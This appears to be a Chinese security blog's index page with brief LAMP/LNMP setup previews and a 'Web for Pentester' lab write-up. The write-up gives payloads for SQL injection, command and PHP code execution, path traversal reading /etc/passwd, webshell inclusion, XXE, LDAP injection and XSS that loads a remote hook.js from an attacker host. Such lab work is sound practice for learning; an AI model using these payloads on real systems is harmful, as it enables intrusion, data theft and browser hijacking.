<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    

    <!--Author-->
    
        <meta name="author" content="John Doe">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="APT404-不疯不魔怎么活"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="APT404-不疯不魔怎么活"/>

    <!--Type page-->
    
        <meta property="og:type" content="website" />
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>page - APT404-不疯不魔怎么活</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
            <h1 id="main-title" class="title">APT404-不疯不魔怎么活</h1>
        
    </div>
</header>

        <section class="main">
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/06/24/Midlnmp/">
                php5.5.38 + mysql-5.5.32 + nginx-1.12.1 + centOS6.8_x64
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-06-24</span>
            
            
            
                <span class="category">
                    <a href="/categories/env/">env</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<p>一、首先,部署nginx</p>
<p>0x01 依旧接着我们之前准备好的系统继续,首先,将所有准备安装的源码包上传至服务器,软件包列表如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">libiconv-1.14.tar.gz</span><br><span class="line">mysql-5.5.32-linux2.6-x86_64.tar.gz</span><br><span class="line">nginx-1.12.1.tar.gz</span><br><span class="line">php-5.5.38.tar.gz</span><br></pre></td></tr></table></figure></p>
<p>此次要实现的大致架构如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php5.5.38 + mysql-5.5.32 + nginx-1.12.1 + centOS6.8_x64</span><br></pre></td></tr></table></figure></p>
        </div>
        <a href="/2016/06/24/Midlnmp/" class="read-more">Read More</a>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/06/23/Oldlamp/">
                httpd 2.2.34  + mysql 5.1.68 + centOS 6.8_x64 + php 5.2.17
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-06-23</span>
            
            
            
                <span class="category">
                    <a href="/categories/env/">env</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br><br>一、首先,部署apache</p>
<p>0x01 还是接着我们之前准备好的系统继续,首先,将所有准备安装的源码包上传至服务器,软件包列表如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">httpd-2.2.34.tar.gz</span><br><span class="line">libiconv-1.14.tar.gz</span><br><span class="line">libmcrypt-2.5.8.tar.gz</span><br><span class="line">mcrypt-2.6.8.tar.gz</span><br><span class="line">mhash-0.9.9.9.tar.gz</span><br><span class="line">mysql-5.1.68.tar.gz</span><br><span class="line">php-5.2.17.tar.gz</span><br><span class="line">cronolog-1.6.2.tar.gz</span><br></pre></td></tr></table></figure></p>
<p>本次要完成的大致架构如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpd 2.2.34  + mysql 5.1.68 + centOS 6.8_x64 + php 5.2.17</span><br></pre></td></tr></table></figure></p>
        </div>
        <a href="/2016/06/23/Oldlamp/" class="read-more">Read More</a>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/06/22/Oldlnmp/">
                php5.3.27 + mysql-5.5.32 + nginx-1.10.3 + centOS6.8_x64
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-06-22</span>
            
            
            
                <span class="category">
                    <a href="/categories/env/">env</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<p>一、首先,部署nginx</p>
<p>0x01 依旧接着我们之前准备好的系统继续,首先,将所有准备安装的源码包上传至服务器,软件包列表如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libiconv-1.14.tar.gz</span><br><span class="line">libmcrypt-2.5.8.tar.gz</span><br><span class="line">mysql-5.5.32-linux2.6-x86_64.tar.gz</span><br><span class="line">nginx-1.10.3.tar.gz</span><br><span class="line">php-5.3.27.tar.gz</span><br></pre></td></tr></table></figure></p>
<p>此次要实现的大致架构如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php5.3.27 + mysql-5.5.32 + nginx-1.10.3 + centOS6.8_x64</span><br></pre></td></tr></table></figure></p>
        </div>
        <a href="/2016/06/22/Oldlnmp/" class="read-more">Read More</a>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/05/26/web-for-pentester/">
                web for pentester writeup
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-05-26</span>
            
            
            
                <span class="category">
                    <a href="/categories/pentestlab/">pentestlab</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入:"></a>sql注入:</h2><p>(1)没有任何过滤的拼接<br><img src="/img/sqli1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example1.php?name=root' and 1=12 union select version(),user(),database(),4,5 --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqli1_s.png" alt="&#39;&#39;"><br></p>
<p>(2)只过滤了空白符,用/**/代替即可<br><img src="/img/sqli2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example2.php?name=root'/</span>**<span class="regexp">/and/</span>**<span class="regexp">/1=112/</span>**<span class="regexp">/union/</span>**<span class="regexp">/select/</span>**<span class="regexp">/1,database(),3,4,5/</span>**<span class="regexp">/%23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqli2_s.png" alt="&#39;&#39;"><br></p>
<p>(3)跟上面一样,只不过这次过滤了多个空白符,bypass方法同上<br><img src="/img/sqli3.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example3.php?name=root'/</span>**<span class="regexp">/and/</span>**<span class="regexp">/1=12/</span>**<span class="regexp">/union/</span>**<span class="regexp">/select/</span>**<span class="regexp">/user(),2,3,4,5/</span>**<span class="regexp">/%23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqli3_s.png" alt="&#39;&#39;"><br></p>
<p>(4)用mysql_real_escape_string()把传过来的id先转义再拼接,其实这里跟没任何过滤是一样的,因为我们的注入语句里根本也没有单引号这类敏感字符<br><img src="/img/sqli4.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example4.php?id=2 and 12=1 union select 1,version(),3,4,5 %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqli4_s.png" alt="&#39;&#39;"><br></p>
<p>(5)要求开头是任意数字,开头本来就是数字呀,搞不懂,所以根本不存在什么绕过,正常写注入语句即可<br><img src="/img/sqli5.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example5.php?id=2 and 1=12 union select version(),2,3,4,5 %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqli5_s.png" alt="&#39;&#39;"><br></p>
<p>(6)要求结尾是任意数字,那就按它说的呗,结尾随便给个数字就好了<br><img src="/img/sqli6.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example6.php?id=2 and 1=12 union select version(),2,3,4,5 %233</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqli6_s.png" alt="&#39;&#39;"><br></p>
<p>(7)注意这里的’/m修饰符,对,没错,就是它,表示多行匹配,所以用%0a换行下即可绕过<br><img src="/img/sqli7.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example7.php?id=2%0aand%0a1=112%0aunion%0aselect%0auser(),2,3,4,5%0a%23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqli7_s.png" alt="&#39;&#39;"><br></p>
<p>(8)用mysql_real_escape_string()做了下转义,而后再拼接,不过需要注意下,这里是用反引号闭合的,虽然没法正常注入,不过盲注依然可行的<br><img src="/img/sqli8.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example8.php?order=name`,(if((ascii(mid((select version()),1,1))=53),sleep(5),1))%23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqli8_s.png" alt="&#39;&#39;"></p>
<p>(9)同上,利用时间盲注依然是可行的<br><img src="/img/sqli9.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example9.php?order=name,(if((ascii(mid((select version()),1,1))=53),sleep(5),1))%23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqli9_s.png" alt="&#39;&#39;"><br><br></p>
<h2 id="php代码执行"><a href="#php代码执行" class="headerlink" title="php代码执行:"></a>php代码执行:</h2><p>(1)把没有任何过滤的内容就直接给eval,将前后的双引号闭合即可<br><img src="/img/code1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/codeexec</span><span class="regexp">/example1.php?name=";system('ls -la');phpinfo();/</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/code1_s.png" alt="&#39;&#39;"><br></p>
<p>(2)同样,对传入的值没有任何过滤,crate_function()相必大家都已经非常熟悉了,专门用来组装函数,在以前的各类php代码执行漏洞中经常能看到它的影子,它会出现代码执行的根本原因还是它内部还会有个eval的动作<br><img src="/img/code2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/codeexec</span><span class="regexp">/example2.php?order=id,$b-&gt;name);&#125;system('ls -al');/</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/code2_s.png" alt="&#39;&#39;"><br></p>
<p>(3)preg_replace()本来是个挺正常的正则替换函数,但加了/e修正符后,瞬间就污了很多,要替换的内容的那一部分会被当做php代码来执行<br><img src="/img/code3.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/codeexec</span><span class="regexp">/example3.php?new=system('ls -l')&amp;pattern=/lamer</span><span class="regexp">/e&amp;base=Hello lamer</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/code3_s.png" alt="&#39;&#39;"><br></p>
<p>(4)闭合前面的单引号,再拼接自己的php代码即可,典型的代码执行函数assert(),不多说,大家应该非常熟悉了,各类php一句话中经常也能看到<br><img src="/img/code4.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/codeexec</span><span class="regexp">/example4.php?name=hacker'.system('ls -la');/</span><span class="regexp">/</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/code4_s.png" alt="&#39;&#39;"><br><br><br></p>
<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取:"></a>任意文件读取:</h2><p>(1)对传入的文件路径没有进行任何过滤,直接跟上要读的文件即可<br><img src="/img/dir.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/dirtrav</span><span class="regexp">/example1.php?file=../</span>../../../etc/passwd</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/dir_s.png" alt="&#39;&#39;"><br></p>
<p>(2)把’/var/www/files/‘这个路径截掉,然后只取后面的文件名,绕过自然也很简单,在这个路径的基础上继续跟上正常的文件路径即可<br><img src="/img/dir1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/dirtrav</span><span class="regexp">/example2.php?file=/var</span><span class="regexp">/www/files</span><span class="regexp">/../</span>../../../etc/passwd</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/dir1_s.png" alt="&#39;&#39;"><br></p>
<p>(3)拼接了个.png的后缀,%00截断后缀php高版本早已修复该漏洞<br><img src="/img/dir2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/dirtrav</span><span class="regexp">/example3.php?file=../</span>../../../etc/passwd%<span class="number">00</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/dir2_s.png" alt="&#39;&#39;"><br><br></p>
<h2 id="php文件包含"><a href="#php文件包含" class="headerlink" title="php文件包含:"></a>php文件包含:</h2><p>(1)没有任何过滤的包含,直接包含本地的webshell即可,如下,被包含的大马正常执行<br><img src="/img/fileinc.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/fileincl</span><span class="regexp">/example1.php?page=../upload</span><span class="regexp">/images/</span><span class="number">404</span>.php</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/fileinc_s.png" alt="&#39;&#39;"><br></p>
<p>(2)在后面拼接了个.php的后缀,同样,利用%00截断<br><img src="/img/fileinc1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/fileincl</span><span class="regexp">/example2.php?page=../upload</span><span class="regexp">/images/</span><span class="number">404</span>.php%<span class="number">00</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/fileinc1_s.png" alt="&#39;&#39;"><br><br></p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行:"></a>命令执行:</h2><p>(1)没有任何过滤的传入,在linux中可用分号分割连续执行多个命令,win中可用&amp;&amp;<br><img src="/img/cmd1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/commandexec</span><span class="regexp">/example1.php?ip=127.0.0.1;ls -la</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/cmd1_s.png" alt="&#39;&#39;"><br></p>
<p>(2)一眼看去,这个ip正则确实没法突破,但后面却紧跟了个/m修饰符,不得不又让我想起了%0a换行<br><img src="/img/cmd2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/commandexec</span><span class="regexp">/example2.php?ip=127.0.0.1%0als -la</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/cmd2_s.png" alt="&#39;&#39;"><br></p>
<p>(3)header()后面竟然没有结束脚本,大忌,header()只是跳转到指定页面,但如果你不手工结束当前脚本,即使跳到别的页面,当前脚本也依然会执行完再退出<br><img src="/img/cmd3.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/commandexec</span><span class="regexp">/example1.php?ip=127.0.0.1;ls -la</span></span><br><span class="line"><span class="regexp">C:\&gt;curl "192.168.3.51/commandexec</span><span class="regexp">/example3.php?ip=127.0.0.1;ls"   注意这里不能用浏览器了,因为它会跳过去,不过,你可以用curl来看结果</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/cmd3_s.png" alt="&#39;&#39;"><br><br></p>
<h2 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入:"></a>XXE注入:</h2><p>(1) 对外部的xml数据没有任何过滤,此时创建一个外部实体,而实体的作用是读取/etc/passwd文件,然后引用该实体,注意要url编码下<br><img src="/img/xxe.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xml</span><span class="regexp">/example1.php?xml=&lt;!DOCTYPE result [&lt;!ENTITY res SYSTEM "file:/</span><span class="regexp">//etc</span><span class="regexp">/passwd" &gt;]&gt;&lt;text&gt;&amp;res;&lt;/text</span>&gt;</span><br><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xml</span><span class="regexp">/example1.php?xml=%3C%21DOCTYPE%20result%20%5B%3C%21ENTITY%20res%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%20%3E%5D%3E%3Ctext%3E%26res%3B%3C%2ftext%3E</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xxe_s.png" alt="&#39;&#39;"><br></p>
<p>(2)没有任何过滤的拼接<br><img src="/img/xxe1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xml</span><span class="regexp">/example2.php?name=hacker'] | /</span><span class="regexp">/*| /</span><span class="regexp">/*['</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xxe1_s.png" alt="&#39;&#39;"><br><br><br><br></p>
<h2 id="ladp注入"><a href="#ladp注入" class="headerlink" title="ladp注入:"></a>ladp注入:</h2><p>(1)ldap允许匿名登录<br><img src="/img/ldap.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/ldap</span><span class="regexp">/example1.php</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/ldap_s.png" alt="&#39;&#39;"><br></p>
<p>(2)闭合原有的过滤器,把后面的password截断即可<br><img src="/img/ldap2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/ldap</span><span class="regexp">/example2.php?name=hacker)(cn=*))%00&amp;password=hacker</span></span><br></pre></td></tr></table></figure></p>
<p><br><br></p>
<h2 id="xss"><a href="#xss" class="headerlink" title="xss:"></a>xss:</h2><p>(1)没有任何过滤的情况<br><img src="/img/xss1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example1.php?name=&lt;script&gt;alert('hello')&lt;/script</span>&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xss1_s.png" alt="&#39;&#39;"><br></p>
<p>(2)只过滤了’<script>‘和’</script>‘，大小写转换<br><img src="/img/xss2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example2.php?name=&lt;Script&gt;alert('hello')&lt;/s</span>Cript&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xss2_s.png" alt="&#39;&#39;"><br></p>
<p>(3)这次依然是过滤’<script></script>‘,且不区分大小写,在&gt;前面加个空格即可绕过<br><img src="/img/xss3.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example3.php?name=&lt;ScripT &gt;alert('hello')&lt;/</span>Script &gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xss3_s.png" alt="&#39;&#39;"><br></p>
<p>(4)不分区大小写过滤了’script’字符,没关系,把它转成对应的ASCII就好了<br><img src="/img/xss4.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example4.php?name=&lt;svg/onload</span>=<span class="string">"var i=String.fromCharCode(115, 99, 114, 105, 112, 116);s = createElement(i);body.appendChild(s);s.src='http://192.168.3.28:3000/hook.js';"</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xss4_s.png" alt="&#39;&#39;"><br></p>
<p>(5)过滤了alert,可惜我们都没用alert<br><img src="/img/xss5.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example5.php?name=hacker&lt;script src="http:/</span><span class="regexp">/192.168.3.28:3000/hook</span>.js<span class="string">"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xss5_s.png" alt="&#39;&#39;"><br></p>
<p>(6)闭合前面的双引号,继续写js代码就好了<br><img src="/img/xss6.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example6.php?name=script";s=document.createElement($a);s.src="http:/</span><span class="regexp">/192.168.3.28:3000/hook</span>.js<span class="string">";document.getElementsByTagName( "</span>head<span class="string">" )[0].appendChild(s);//</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xss6_s.png" alt="&#39;&#39;"><br></p>
<p>(7)对特特殊字符进行实体化,但这似乎并没能改变什么<br><img src="/img/xss7.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example7.php?name=script';s=document.createElement($a);s.src='http:/</span><span class="regexp">/192.168.3.28:3000/hook</span>.js<span class="string">';document.getElementsByTagName( '</span>head<span class="string">')[0].appendChild(s);//</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xss7_s.png" alt="&#39;&#39;"><br></p>
<p>(8)闭合action的另一半双引号,后面再跟上script标记即可绕过<br><img src="/img/xss8.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example8.php/</span><span class="string">"&gt;&lt;script&gt;alert('hello')&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xss8_s.png" alt="&#39;&#39;"><br></p>
<p>(9)location.hash.substr获取的内容没有任何过滤<br><img src="/img/xss9.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/xss</span><span class="regexp">/example9.php#&lt;script src=http:/</span><span class="regexp">/192.168.3.28:3000/hook</span>.js&gt;&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/xss9_s.png" alt="&#39;&#39;"><br><br></p>
<h2 id="php文件上传"><a href="#php文件上传" class="headerlink" title="php文件上传:"></a>php文件上传:</h2><p>(1)没有任何过滤,直接传php,大马正常执行<br><img src="/img/upload1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/upload</span><span class="regexp">/example1.php</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/upload1_s.png" alt="&#39;&#39;"><br><br><img src="/img/upload1_s_1.png" alt="&#39;&#39;"><br></p>
<p>(2)黑名单绕过,只要.php后缀,.php3即可绕过<br><img src="/img/upload2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/upload</span><span class="regexp">/example2.php</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/upload2_s.png" alt="&#39;&#39;"><br><br><img src="/img/upload2_s_1.png" alt="&#39;&#39;"><br><br><br><br></p>
<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;闲的没事儿,拿来跑跑,没啥技术含量,顺带记录下,只为留给有需要的人</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/05/20/bypass-waf-note/">
                bypass waf入门之sql注入 [ 内联注释篇 ]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-05-20</span>
            
            
            
                <span class="category">
                    <a href="/categories/bypasswaf/">bypasswaf</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
